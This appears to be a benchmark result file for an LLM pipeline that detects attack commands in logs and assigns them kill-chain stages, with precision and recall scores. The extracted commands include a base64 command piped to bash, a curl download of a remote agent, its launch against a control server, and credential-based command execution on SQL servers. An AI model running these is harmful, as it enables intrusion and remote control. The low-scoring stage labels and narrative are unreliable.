@@ -1,0 +1,80 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "bash -c echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== | base64 -d|bash",
+        "stage": "Execution"
+      },
+      {
+        "command": "curl -O  http://124.223.85.207:8079/sandcat-linux",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "chmod +x sandcat-linux",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "nohup ./sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v",
+        "stage": "Persistence"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --enable",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec whoami",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec 'cmd /c powershell.exe -ExecutionPolicy Bypass -C $ip=",
+        "stage": "Command and Control"
+      }
+    ],
+    "narrative": "The attackers executed encoded commands to establish a foothold in the system, bypassing defenses by changing the execution permission of `sandcat-linux`. They persisted through non-root processes like `sandcat-linux` and exploited vulnerabilities via `sqltool_amd64_upx`, allowing privilege escalation attacks on multiple SQL servers. Using gathered credentials, the adversaries accessed critical information stored within the database. The final phase consisted of establishing communication channels between their server and compromised hosts, making use of remote access tools like PowerShell.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 42052,
+      "completion_tokens": 1189,
+      "total_tokens": 43241,
+      "wall_clock_s": 40.375,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.7142857142857143,
+      "recall": 0.5555555555555556,
+      "f1": 0.6250000000000001,
+      "tp": 5,
+      "fp": 2,
+      "fn": 4
+    },
+    "stage": {
+      "precision": 0.14285714285714285,
+      "recall": 0.14285714285714285,
+      "f1": 0.14285714285714285,
+      "tp": 1,
+      "fp": 6,
+      "fn": 6,
+      "recall_partial": 0.2857142857142857
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 42052,
+      "completion_tokens": 1189,
+      "total_tokens": 43241,
+      "wall_clock_s": 40.375,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "scale_v3",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": false,
+    "got_link_hints": false
+  }
+}
